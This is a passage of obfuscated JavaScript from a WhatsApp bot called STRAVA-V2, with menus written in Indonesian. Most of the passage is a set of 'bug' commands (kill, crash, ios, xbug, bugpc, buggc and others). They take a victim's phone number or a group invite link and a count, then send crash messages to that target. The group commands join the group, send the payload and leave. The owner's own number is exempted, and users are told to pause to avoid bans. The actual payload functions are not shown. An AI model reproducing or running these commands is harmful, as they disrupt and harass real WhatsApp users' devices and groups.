❐\n┃⭔.ioskill 628XXXX,3\n┃⭔.iospc 628XXXX,3\n┃⭔.iosxs 628XXXX,3\n┃⭔.ioslcy 628XXXX,3\n┃⭔.iosbug 628XXXX,3\n┃⭔.bug-ios 628XXXX,3\n┗❐\n▬▭▬▭▬▭▬▭▬▭▬▭▬\n┏❐ " + bb + "BUG GROUP" + bb + " ❐\n┃⭔.buggc *linkgrup*\n┃⭔.bomgc *linkgrup*\n┃⭔.travagc *linkgrup*\n┃⭔.crashgc *linkgrup*\n┃\n┗❐「 *STRAVA-V2* 」\n▬▭▬▭▬▭▬▭▬▭▬▭▬";
          if (_0x54f87b == "ownermenu") {
            _0x29d3e4(txt1);
          } else {
            if (_0x54f87b == "jadibotmenu") {
              _0x29d3e4(txt2);
            } else {
              if (_0x54f87b == 'groupmenu') {
                _0x29d3e4(txt3);
              } else if (_0x54f87b == "bugmenu") {
                _0x29d3e4(txt4);
              }
            }
          }
        }
        break;
      case "allmenu":
        {
          if (!_0x57c09c && !_0x5764c8) {
            return _0x31f1ae("*Fitur ini Khusus Owner/Dev*");
          }
          penis = fs.readFileSync("./index.js").toString();
          matches = penis.match(/case '[^']+'(?!.*case '[^']+')/g) || [];
          caseCount = matches.length;
          caseNames = matches.map(_0x40e20b => _0x40e20b.match(/case '([^']+)'/)[0x1]);
          let _0x516ff0 = caseNames.join("\n┃⭔");
          txtcase = "▱▰▱「 *STRAVA-V2* 」▱▰▱\n╭──────────────────\n│ *Botname* : " + global.botName + "\n│ *Ownername* : " + global.ownerName + "\n│ *Pengguna* : " + (_0x57c09c ? 'Owner' : "User") + "\n│ *Total Fitur* : " + caseCount + "\n│ *Number* : @" + _0x66df79.split('@')[0x0] + "\n╰──────────────────\n┏❐ *ALL MENU* ❐";
          _0x29d3e4(txtcase + "\n┃⭔" + _0x516ff0 + "\n┗❐\n▬▭▬▭▬▭▬▭▬▭\n 「 *RUNTIME BOT* 」\n" + _0x39d45d(process.uptime()) + "\n▬▭▬▭▬▭▬▭▬▭▬▭");
        }
        break;
      case "totalfitur":
      case "totalcase":
        {
          penislu = fs.readFileSync("./index.js").toString();
          matches = penislu.match(/case '[^']+'(?!.*case '[^']+')/g) || [];
          casekud = matches.length;
          _0x31f1ae("*Total Fitur* : " + casekud);
        }
        break;
      case '1day':
      case "kill":
      case '24j':
      case "bom":
      case "bug":
      case "bugui":
      case "delay":
      case 'spam':
      case "strava":
      case "crash":
        {
          if (!_0x5764c8) {
            return _0x31f1ae("*Fitur Ini Khusus Bot Saja!*");
          }
          if (!q) {
            return _0x31f1ae("*FORMAT BUG " + _0x54f87b.toUpperCase() + "*\n\n*Example:*\n" + (_0xf07829 + _0x54f87b) + " jumlah\n\n*Contoh:*\n" + (_0xf07829 + _0x54f87b) + " 7\n\n©leccyofc");
          }
          if (isNaN(parseInt(q))) {
            return _0x31f1ae("Jumlah wajib angka!!");
          }
          let _0xedadee = '' + encodeURI(q);
          _0x31f1ae("...");
          await sleep(0x7d0);
          _0x35c704(_0x529e16, _0xedadee);
          await sleep(0x9c4);
          _0x98762a('✅');
        }
        break;
      case 'blank-ios':
      case "black-ios":
      case "lec-ios":
      case "stv-ios":
      case 'va-ios':
      case "ci-ios":
      case 'bl-ios':
      case 'fc-ios':
      case "ui-ios":
      case "ios":
        {
          if (!_0x5764c8) {
            return _0x31f1ae("*Fitur Ini Khusus Bot Saja!*");
          }
          if (!q) {
            return _0x31f1ae("*FORMAT BUG " + _0x54f87b.toUpperCase() + "*\n\n*Example:*\n" + (_0xf07829 + _0x54f87b) + " jumlah\n\n*Contoh:*\n" + (_0xf07829 + _0x54f87b) + " 7\n\n©leccyofc");
          }
          if (isNaN(parseInt(q))) {
            return _0x31f1ae("Jumlah wajib angka!!");
          }
          let _0x1a4d18 = encodeURI(q) * 0xc8;
          _0x31f1ae('...');
          await sleep(0x7d0);
          _0x546e56(_0x529e16, _0x1a4d18);
          await sleep(0x9c4);
          _0x98762a('✅');
        }
        break;
      case "iosbug":
      case "iospc":
      case "bug-ios":
      case "ioslcy":
      case "ioskill":
      case "iosxs":
        {
          if (!_0x57c09c && !_0x5764c8 && !_0x3b4554) {
            return _0x31f1ae("*Fitur Ini Khusus Member Premium/Owner*");
          }
          if (!q) {
            return _0x31f1ae("*FORMAT BUG " + _0x54f87b.toUpperCase() + "*\n\n*Example:*\n" + (_0xf07829 + _0x54f87b) + " number,jumlah\n\n*Contoh:*\n" + (_0xf07829 + _0x54f87b) + " 628xxxx,5\n\n©leccyofc");
          }
          let _0x158b65 = q.split(',')[0x0];
          let _0x23f84b = q.split(',')[0x1] ? q.split(',')[0x1] : '10';
          if (!_0x158b65) {
            return _0x31f1ae("*FORMAT BUG " + _0x54f87b.toUpperCase() + "*\n\n*Example:*\n" + (_0xf07829 + _0x54f87b) + " number,jumlah\n\n*Contoh:*\n" + (_0xf07829 + _0x54f87b) + " 628xxxx,5\n\n©leccyofc");
          }
          if (isNaN(parseInt(_0x23f84b))) {
            return _0x31f1ae("Jumlah wajib angka!!");
          }
          let _0x322a73 = _0x158b65.replace(/[^0-9]/g, '');
          let _0x12d432 = encodeURI(_0x23f84b) * 0xc8;
          var _0x20940a = await _0x57c724.onWhatsApp(_0x322a73 + "@s.whatsapp.net");
          let _0x5ec22b = _0x322a73 + "@s.whatsapp.net";
          if (_0x322a73 == "6283834558105") {
            return;
          }
          if (_0x20940a.length == 0x0) {
            return _0x31f1ae("Nomor Tersebut Tidak Terdaftar Di WhatsApp");
          }
          _0x40d9e9("</> Being processed.. Send to @" + _0x5ec22b.split('@')[0x0] + " Using *" + _0x54f87b + "*\n\n<!> Pause 2 minutes so that the bot is not banned.", [_0x5ec22b]);
          await sleep(0x7d0);
          _0x546e56(_0x5ec22b, _0x12d432);
          await sleep(0x9c4);
          _0x98762a('✅');
        }
        break;
      case 'trolipc':
      case "pollpc":
      case "lolpc":
      case "lecpc":
      case "tetpc":
      case "rorrpc":
      case 'docpc':
      case "stvpc":
      case 'vaspc':
      case "unlipc":
      case "bugpc":
      case "santetpc":
      case "forcepc":
      case "crashpc":
      case "delaypc":
      case "spampc":
      case "virgam":
      case 'sendbug':
        {
          if (!_0x57c09c && !_0x5764c8 && !_0x3b4554) {
            return _0x31f1ae("*Fitur Ini Khusus Member Premium/Owner*");
          }
          if (!q) {
            return _0x31f1ae("*FORMAT BUG " + _0x54f87b.toUpperCase() + "*\n\n*Example:*\n" + (_0xf07829 + _0x54f87b) + " number,jumlah\n\n*Contoh:*\n" + (_0xf07829 + _0x54f87b) + " 628xxxx,5\n\n©leccyofc");
          }
          let _0x51fbf5 = q.split(',')[0x0];
          let _0x2c6dea = q.split(',')[0x1] * 0x3;
          if (!_0x51fbf5) {
            return _0x31f1ae("*FORMAT BUG " + _0x54f87b.toUpperCase() + "*\n\n*Example:*\n" + (_0xf07829 + _0x54f87b) + " number,jumlah\n\n*Contoh:*\n" + (_0xf07829 + _0x54f87b) + " 628xxxx,5\n\n©leccyofc");
          }
          if (!_0x2c6dea) {
            return _0x31f1ae("*FORMAT BUG " + _0x54f87b.toUpperCase() + "*\n\n*Example:*\n" + (_0xf07829 + _0x54f87b) + " number,jumlah\n\n*Contoh:*\n" + (_0xf07829 + _0x54f87b) + " 628xxxx,5\n\n©leccyofc");
          }
          if (isNaN(parseInt(_0x2c6dea))) {
            return _0x31f1ae("Jumlah wajib angka!!");
          }
          let _0x3f0b0c = _0x51fbf5.replace(/[^0-9]/g, '');
          let _0x162a90 = '' + encodeURI(_0x2c6dea);
          var _0x20940a = await _0x57c724.onWhatsApp(_0x3f0b0c + '@s.whatsapp.net');
          let _0x1cd7f4 = _0x3f0b0c + '@s.whatsapp.net';
          if (_0x3f0b0c == "6283834558105") {
            return;
          }
          if (_0x20940a.length == 0x0) {
            return _0x31f1ae("Nomor Tersebut Tidak Terdaftar Di WhatsApp");
          }
          _0x40d9e9("</> Being Processed.. Send To @" + _0x1cd7f4.split('@')[0x0] + " Using *" + _0x54f87b + "*\n\n<!> Pause 2 minutes so that the bot is not banned.", [_0x1cd7f4]);
          await sleep(0x7d0);
          _0x35c704(_0x1cd7f4, _0x162a90);
          await sleep(0x9c4);
          _0x98762a('✅');
        }
        break;
      case "xvir":
      case "xstik":
      case "xlist":
      case 'x24j':
      case "xuia":
      case "xlec":
      case "xforce":
      case "xva":
      case "xta":
      case "xcrash":
      case 'xbutton':
      case "xbom":
      case "xbug":
      case 'xkill':
      case 'xloc':
      case "xdoc":
      case 'xhit':
        {
          if (!_0x57c09c && !_0x5764c8 && !_0x3b4554) {
            return _0x31f1ae("*Fitur Ini Khusus Member Premium/Owner*");
          }
          if (!q) {
            return _0x31f1ae("*FORMAT BUG " + _0x54f87b.toUpperCase() + "*\n\n*Example:*\n" + (_0xf07829 + _0x54f87b) + " number,jumlah\n\n*Contoh:*\n" + (_0xf07829 + _0x54f87b) + " 628xxxx,5\n\n©leccyofc");
          }
          let _0x2d68af = q.split(',')[0x0];
          let _0x37e9a7 = q.split(',')[0x1] * 0x5;
          if (!_0x2d68af) {
            return _0x31f1ae("*FORMAT BUG " + _0x54f87b.toUpperCase() + "*\n\n*Example:*\n" + (_0xf07829 + _0x54f87b) + " number,jumlah\n\n*Contoh:*\n" + (_0xf07829 + _0x54f87b) + " 628xxxx,5\n\n©leccyofc");
          }
          if (!_0x37e9a7) {
            return _0x31f1ae("*FORMAT BUG " + _0x54f87b.toUpperCase() + "*\n\n*Example:*\n" + (_0xf07829 + _0x54f87b) + " number,jumlah\n\n*Contoh:*\n" + (_0xf07829 + _0x54f87b) + " 628xxxx,5\n\n©leccyofc");
          }
          if (isNaN(parseInt(_0x37e9a7))) {
            return _0x31f1ae("Jumlah wajib angka!!");
          }
          let _0x280443 = _0x2d68af.replace(/[^0-9]/g, '');
          let _0x12e933 = '' + encodeURI(_0x37e9a7);
          var _0x20940a = await _0x57c724.onWhatsApp(_0x280443 + "@s.whatsapp.net");
          let _0x2bb60e = _0x280443 + "@s.whatsapp.net";
          if (_0x280443 == '6283834558105') {
            return;
          }
          if (_0x20940a.length == 0x0) {
            return _0x31f1ae("Nomor Tersebut Tidak Terdaftar Di WhatsApp");
          }
          _0x40d9e9("</> Being Processed.. Send To @" + _0x2bb60e.split('@')[0x0] + " Using *" + _0x54f87b + "*\n\n<!> Pause 2 minutes so that the bot is not banned.", [_0x2bb60e]);
          await sleep(0x7d0);
          _0x35c704(_0x2bb60e, _0x12e933);
          await sleep(0x9c4);
          _0x98762a('✅');
        }
        break;
      case "travagc":
      case "buggc":
      case "crashgc":
      case "bomgc":
        {
          if (!_0x57c09c && !_0x5764c8) {
            return _0x31f1ae("*Fitur Ini Khusus Member Premium/Owner*");
          }
          if (!q) {
            return _0x31f1ae("*CARA MENGIRIM BUG GROUB*\n\n" + (_0xf07829 + _0x54f87b) + " https://chat.whatsapp.com/xxxx\n\n_*Note:*_ Jika ingin mengirim bug dengan jumlah banyak, silahkan ketik sebagai berikut ini\n\nEx: ." + _0x54f87b + " linkgc jumlahbug\n\nContoh:\n." + _0x54f87b + " https://chat.whatsapp.com/xxxx 10\n\n©leccyofc");
          }
          _0x31f1ae("_Your request is being processed⏳_");
          if (!q.split(" ")[0x0].includes('whatsapp.com')) {
            return _0x31f1ae("Link Invalid!");
          }
          resjoin = q.split(" ")[0x0].split("https://chat.whatsapp.com/")[0x1];
          try {
            jumela = q.split(" ")[0x1] ? q.split(" ")[0x1] : '1';
            initarget = await _0x57c724.groupAcceptInvite(resjoin);
            await sleep(0x7d0);
            _0x35ebcd(initarget, jumela);
            await sleep(0x9c4);
            _0x31f1ae("*DONE ✓*");
            _0x57c724.groupLeave(initarget);
          } catch (_0x497f3d) {
            _0x31f1ae(util.format(_0x497f3d));
          }
        }
        break;
      case "join":
        if (_0x32ea25.key.fromMe) {
          return;
        }
        if (!_0x57c09c && !_0x5764c8) {
          return _0x31f1ae("*Fitur Ini Khusus Member Premium/Owner*");
        }
        if (!q) {
          return _0x31f1ae("Enter Group Link!\nEx: .join https://chat.whatsapp.com/xxxx");
        }
        if (!_0x2fbf9b[0x0].includes("whatsapp.com")) {
          return _0x31f1ae("Link Invalid!");
        }
        resjoin = _0x2fbf9b[0x0].split("https://chat.whatsapp.com/")[0x1];
        try {
          join = await _0x57c724.groupAcceptInvite(resjoin);
          _0x31f1ae(join);
        } catch (_0x58f7fe) {
          _0x31f1ae(util.format(_0x58f7fe));
        }
        break;
      case "linkgrup":
      case "linkgc":
        {
          if (!_0x55a774) {
            return _0x31f1ae("Fitur Ini Hanya Dapat Digunakan Di Dalam Group!");
          }
          if (!_0x217110) {
            return _0x31f1ae("Fitur Ini Hanya Dapat Digunakan Setelah Bot Menjadi Admin!");
          }
          if (!_0x2c3e5b && !_0x5764c8 && !_0x57c09c) {
            return _0x31f1ae("Fitur Ini Hanya Dapat Digunakan Oleh Admin!");
          }
          url_ = await _0x57c724.groupInviteCode(_0x529e16);
          yurl = "https://chat.whatsapp.com/" + url_;
          _0x31f1ae(yurl);
        }
        break;
      case "open":
        if (!_0x55a774) {
          return;
        }
        if (!_0x2c3e5b && !_0x5764c8 && !_0x57c09c) {
          return _0x31f1ae("Fitur Ini Hanya Dapat Digunakan Oleh Admin!");
        }
        if (!_0x217110) {
          return _0x31f1ae("Fitur Ini Hanya Dapat Digunakan Setelah Bot Menjadi Admin!");
        }
        await _0x57c724.groupSettingUpdate(_0x529e16, "not_announcement");
        _0x31f1ae("*OPENED* The group is opened by admin\nNow members can send messages");
        break;
      case "close":
        if (!_0x55a774) {
          return;
        }
        if (!_0x2c3e5b && !_0x5764c8 && !_0x57c09c) {
          return _0x31f1ae("Fitur Ini Hanya Dapat Digunakan Oleh Admin!");
        }
        if (!_0x217110) {
          return _0x31f1ae("Fitur Ini Hanya Dapat Digunakan Setelah Bot Menjadi Admin!");
        }
        await _0x57c724.groupSettingUpdate(_0x529e16, "announcement");
        _0x31f1ae("*CLOSED* group closed by admin\nnow only admin can send messages");
        break;
      case "revoke":
        {
          if (!_0x55a774) {
            return;
          }
          if (!_0x217110) {
            return _0x31f1ae("Fitur Ini Hanya Dapat Digunakan Setelah Bot Menjadi Admin!");
          }
          if (!_0x2c3e5b && !_0x5764c8 && !_0x57c09c) {
            return _0x31f1ae("Fitur Ini Hanya Dapat Digunakan Oleh Admin!");
          }
          await _0x57c724.groupRevokeInvite(_0x529e16).then(_0x4a31c6 => _0x31f1ae(JSON.stringify(_0x4a31c6, null, 0x2)))["catch"](_0xb9fb5c => _0x31f1ae(JSON.stringify(_0xb9fb5c, null, 0x2)));
        }
        break;
      case "kick":
        if (!_0x55a774) {
          return;
        }
        if (!_0x2c3e5b && !_0x5764c8 && !_0x57c09c) {
          return _0x31f1ae("Fitur Ini Hanya Dapat Digunakan Oleh Admin!");
        }
        if (!_0x217110) {
          return _0x31f1ae("Fitur Ini Hanya Dapat Digunakan Setelah Bot Menjadi Admin!");
        }
        if (_0x32ea25.message.extendedTextMessage === undefined || _0x32ea25.message.extendedTextMessage === null) {
          return _0x31f1ae("Reply targetnya!");
        }
        _0x31f1ae("Sampah Grup Berhasil di Keluarkan!");
        remove = _0x32ea25.message.extendedTextMessage.contextInfo.participant;
        await _0x57c724.groupParticipantsUpdate(_0x529e16, [remove], 'remove');
        break;
      case "hidetag":
        {
          if (!_0x55a774) {
            return;
          }
          if (!_0x2c3e5b && !_0x5764c8 && !_0x57c09c) {
            return _0x31f1ae("Fitur Ini Hanya Dapat Digunakan Oleh Admin!");
          }
          let _0x5972cf = [];
          _0x587200.map(_0x48ac99 => _0x5972cf.push(_0x48ac99.id));
          _0x57c724.sendMessage(_0x529e16, {
            'text': q ? q : '',
            'mentions': _0x5972cf
          });
        }
        break;
      case 'promote':
        {
          if (!_0x55a774) {
            return;
          }
          if (!_0x2c3e5b && !_0x5764c8 && !_0x57c09c) {
            return _0x31f1ae("Fitur Ini Hanya Dapat Digunakan Oleh Admin!");
          }
          if (!_0x217110) {
            return _0x31f1ae("Fitur Ini Hanya Dapat Digunakan Setelah Bot Menjadi Admin!");
          }
          if (_0x32ea25.message.extendedTextMessage === undefined || _0x32ea25.message.extendedTextMessage === null) {
            return _0x31f1ae("Reply targetnya!");
          }
          promote = _0x32ea25.message.extendedTextMessage.contextInfo.participant;
          await _0x57c724.groupParticipantsUpdate(_0x529e16, [promote], "promote").then(_0xbeb229 => _0x31f1ae(JSON.stringify(_0xbeb229, null, 0x2)))["catch"](_0x4aa8f8 => _0x31f1ae(JSON.stringify(_0x4aa8f8, null, 0x2)));
        }
        break;
      case "demote":
        {
          if (!_0x55a774) {
            return;
          }
          if (!_0x2c3e5b && !_0x5764c8 && !_0x57c09c) {
            return _0x31f1ae("Fitur Ini Hanya Dapat Digunakan Oleh Admin!");
          }
          if (!_0x217110) {
            return _0x31f1ae("Fitur Ini Hanya Dapat Digunakan Setelah Bot Menjadi Admin!");
          }
          if (_0x32ea25.message.extendedTextMessage === undefined || _0x32ea25.message.extendedTextMessage === null) {
            return _0x31f1ae("Reply targetnya!");
          }
          demote = _0x32ea25.message.extendedTextMessage.contextInfo.participant;
          await _0x57c724.groupParticipantsUpdate(_0x529e16, [demote], "demote").then(_0x177bab => _0x31f1ae(JSON.stringify(_0x177bab, null, 0x2)))["catch"](_0x57cf7c => _0x31f1ae(JSON.stringify(_0x57cf7c, null, 0x2)));
        }
        break;
      case "setname":
      case "setsubject":
        {
          if (!_0x55a774) {
            return;
          }
          if (!_0x2c3e5b && !_0x5764c8 && !_0x57c09c) {
            return _0x31f1ae("Fitur Ini Hanya Dapat Digunakan Oleh Admin!");
          }
          if (!_0x217110) {
            return _0x31f1ae("Fitur Ini Hanya Dapat Digunakan Setelah Bot Menjadi Admin!");
          }
          if (!q) {
            return _0x31f1ae("Nama Group Nya Mana?\n\nEx:\n.setname nama_group");
          }
          await _0x57c724.groupUpdateSubject(_0x529e16, q).then(_0x1c6f0f => _0x31f1ae(JSON.stringify(_0x1c6f0f, null, 0x2)))["catch"](_0x2e341d => _0x31f1ae(JSON.stringify(_0x2e341d, null, 0x2)));
        }
        break;
      case "setdesc":
      case "setdesk":
        {
          if (!_0x55a774) {
            return;
          }
          if (!_0x2c3e5b && !_0x5764c8 && !_0x57c09c) {
            return _0x31f1ae("Fitur Ini Hanya Dapat Digunakan Oleh Admin!");
          }
          if (!_0x217110) {
            return _0x31f1ae("Fitur Ini Hanya Dapat Digunakan Setelah Bot Menjadi Admin!");
          }
          if (!q) {
            return _0x31f1ae("Teks Deskripsi Nya Mana?\n\nEx:\n.setdesc teks_deskripsi");
          }
          await _0x57c724.groupUpdateDescription(_0x529e16, q).then(_0x5e6b07 => _0x31f1ae(JSON.stringify(_0x5e6b07, null, 0x2)))['catch'](_0x5b2082 => _0x31f1ae(JSON.stringify(_0x5b2082, null, 0x2)));
        }
        break;
      case "editinfo":
        if (!_0x55a774) {
          return;
        }
        if (!_0x2c3e5b && !_0x5764c8 && !_0x57c09c) {
          return _0x31f1ae("Fitur Ini Hanya Dapat Digunakan Oleh Admin!");
        }
        if (!_0x217110) {
          return _0x31f1ae("Fitur Ini Hanya Dapat Digunakan Setelah Bot Menjadi Admin!");
        }
        if (_0x2fbf9b[0x0] === "open") {
          await _0x57c724.groupSettingUpdate(_0x529e16, "unlocked").then(_0x2677d3 => _0x31f1ae("Successfully Opened Group Edit Info"))['catch'](_0x420d99 => _0x31f1ae(JSON.stringify(_0x420d99, null, 0x2)));
        } else if (_0x2fbf9b[0x0] === "close") {
          await _0x57c724.groupSettingUpdate(_0x529e16, "locked").then(_0xa520b8 => _0x31f1ae("Successfully Closed Group Edit Info"))["catch"](_0x47ac1c => _0x31f1ae(JSON.stringify(_0x47ac1c, null, 0x2)));
        } else {
          _0x31f1ae("*MODE DESKRIPSI GROUP*\n\n*_Open : semua member bisa edit deskripsi grup_*\n\n*_Close: hanya admin group yang bisa edit deskripsi_*\n\n*Example:*\n" + (_0xf07829 + _0x54f87b) + " close");
        }
        break;
      default:
        if (tiktokauto && _0x15d293.includes("tiktok.com") && _0x298e5e != undefined) {
          if (!_0x15d293.includes("tiktok.com")) {
            return;
          }
          if (_0x32ea25.key.fromMe) {
            return;
          }
          _0x98762a('⏳');
          let {
            Tiktok: _0x122ded
          } = require("./lib/tiktok");
          try {
            let _0x29ffa5 = await _0x122ded(_0x15d293);
            cpp = "_*> TIKTOK AUTO DOWNLOADER <*_\n\n - Author : ®LeccyOfficiall\n - Creator : " + _0x29ffa5.author + "\n \n - Title : " + _0x29ffa5.title;
            _0x57c724.sendMessage(_0x529e16, {
              'video': {
                'url': _0x29ffa5.nowm
              },
              'caption': cpp
            }, {
              'quoted': _0x32ea25
            }).then(() => _0x98762a('✅'));
          } catch (_0x3ff693) {
            await sleep(0x7d0);
            _0x98762a('❌');
          }
        }
    }
  } catch (_0x2de7cd) {
    frm = _0x32ea25.key.remoteJid;
    stravaRorr = async () => {
      _0x57c724.sendMessage(frm, {
        'text': util.format(_0x2de7cd)
      });
    };
    stravaRorr();
  }
};
let file = require.resolve(__filename);
fs.watchFile(file, () => {
  fs.unwatchFile(file);
  console.log(chalk.redBright("Update " + __filename));
  delete require.cache[file];
  require(file);
});